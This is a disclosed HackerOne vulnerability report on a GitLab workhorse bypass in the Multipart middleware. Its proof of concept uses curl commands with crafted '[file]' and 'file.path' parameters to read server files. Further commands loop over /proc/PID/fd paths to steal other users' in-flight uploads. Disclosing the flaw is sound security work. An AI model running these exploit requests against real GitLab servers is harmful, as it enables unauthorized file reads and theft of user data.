# gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read

## Report Details
- **Report ID**: 850447
- **URL**: https://hackerone.com/reports/850447
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-04-15T14:59:54.154Z
- **Disclosed**: 2020-06-08T04:57:08.889Z

## Reporter
- **Username**: vakzz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
### Summary
Extracted from https://hackerone.com/reports/835455#activity-7672566

While testing and looking at the patch for the nuget package workhorse bypass (https://gitlab.com/gitlab-org/gitlab/issues/209080 I think) I came across a more widespread bypass:

```bash
# create test file on gitlab server
echo hello > /tmp/ggg; sudo chown git:git /tmp/ggg

# attacker
curl -XPUT -v -F '[package]=@/tmp/lala.txt' "http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg"

{"message":"201 Created"}
```

Using `[package]` as the field name causes the `@rewritten_fields` to contain:

```json
{
  "rewritten_fields": {
    "[package]": "/var/opt/gitlab/gitlab-rails/shared/packages/tmp/uploads/lala.txt539589799"
  },
  "iss": "gitlab-workhorse"
}
```
This is then used `parsed_field = Rack::Utils.parse_nested_query(field)` which ends up creating the hash `{"package"=>nil}` (same as package would return). This passes the validation, but the `Multipart::Handler` will then use the query params as they match instead of the payload that workhorse sends through.

This also allows for any file in the following to be accessed:

```ruby
       def allowed_paths
          [
            ::FileUploader.root,
            Gitlab.config.uploads.storage_path,
            JobArtifactUploader.workhorse_upload_path,
            File.join(Rails.root, 'public/uploads/tmp')
          ]
        end
```

This could be done anywhere that accelerated uploads, eg the `UploadsController` or uploading a wiki file.

Using the wiki api removes the restriction that the file needs to be owned by `git` due to `file_content: attrs[:file].read` happening instead of moving the original file:

```bash
echo hello > /tmp/ggg; sudo chown root:root /tmp/ggg

$ curl -g -XPOST -v -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'

{"file_name":"ggg","file_path":"uploads/58ec1627b3f14eba0a16659fd859da63/ggg","branch":"master","link":{"url":"uploads/58ec1627b3f14eba0a16659fd859da63/ggg","markdown":"[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)"}}
```

It's also fairly easy to steal incoming files tmp files that are currently opened in rails by:

1. Determine a valid PID by looping over `/proc/PID` until a `cwd` is found and readable by `git` (eg the `unicorn` worker will have `/proc/19606/cwd -> /var/opt/gitlab/gitlab-rails/working`) and traverse to a valid upload path:

    ```bash
$ curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19601/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
500
$ curl -s -o /dev/null -w "%{http_code}\n" -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'
201
    ```

1. Using this pid, use `/proc/PID/fd/XX` as the `file.path` (looking at my server a fd of 44 was the used pretty consistently for tmp files) and run it in a loop:

    ```bash
$ while true; do curl -s -XPOST -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt'| grep file_name; done
    ```

1. Upload a bunch of things, eventually a file will be stolen:

    ```json
{"file_name":"image.png115893730","file_path":"uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730","branch":"master","link":{"url":"uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730","markdown":"[image.png115893730](uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730)"}}
    ```

### Steps to reproduce

1. create a new project
1. create a wiki page
1. create a test file on the gitlab server: `echo hello > /tmp/ggg;`
1. create a dummy file on the attackers server `echo unused > /tmp/lala.txt`
1. Upload a wiki file using the crafted params
        ```bash
$ curl -g -XPOST -v -H "Authorization: Bearer $TOKEN" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'`
{"file_name":"ggg","file_path":"uploads/58ec1627b3f14eba0a16659fd859da63/ggg","branch":"master","link":{"url":"uploads/58ec1627b3f14eba0a16659fd859da63/ggg","markdown":"[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)"}}
        ```
1. paste the markdown into the wiki page and download the file

### Impact
* read known files in `::FileUploader.root, Gitlab.config.uploads.storage_path, JobArtifactUploader.workhorse_upload_path, File.join(Rails.root, 'public/uploads/tmp')`
* read unknown inflight files by using the symlinks in `/proc/PID/fd/XX` belonging to other users.

### Examples
* https://gitlab.com/vakzz-h1/workhorse-bypass/-/wikis/home
The above was uploaded using `file.path=/opt/gitlab/embedded/service/gitlab-rails/public/422.html` to verify.

### What is the current *bug* behavior?
An attacker can specify `file.*` params and have gitlab believe they are valid and signed 

### What is the expected *correct* behavior?
Only params from the workhorse should be valid

### Output of checks
#### Results of GitLab environment info
```
System information
System:     Ubuntu 18.04
Proxy:      no
Current User:   git
Using RVM:  no
Ruby Version:   2.6.5p114
Gem Version:    2.7.10
Bundler Version:1.17.3
Rake Version:   12.3.3
Redis Version:  5.0.7
Git Version:    2.24.1
Sidekiq Version:5.2.7
Go Version: unknown

GitLab information
Version:    12.9.3-ee
Revision:   7c13691fb8e
Directory:  /opt/gitlab/embedded/service/gitlab-rails
DB Adapter: PostgreSQL
DB Version: 10.12
URL:        http://gitlab-vm.local
HTTP Clone URL: http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:  git@gitlab-vm.local:some-group/some-project.git
Elasticsearch:  no
Geo:        no
Using LDAP: no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:    12.0.0
Repository storage paths:
- default:  /var/opt/gitlab/git-data/repositories
GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell
Git:        /opt/gitlab/embedded/bin/git
```

## Impact

* read known files in `::FileUploader.root, Gitlab.config.uploads.storage_path, JobArtifactUploader.workhorse_upload_path, File.join(Rails.root, 'public/uploads/tmp')`
* read unknown inflight files by using the symlinks in `/proc/PID/fd/XX` belonging to other users.

## Attachments
No attachments
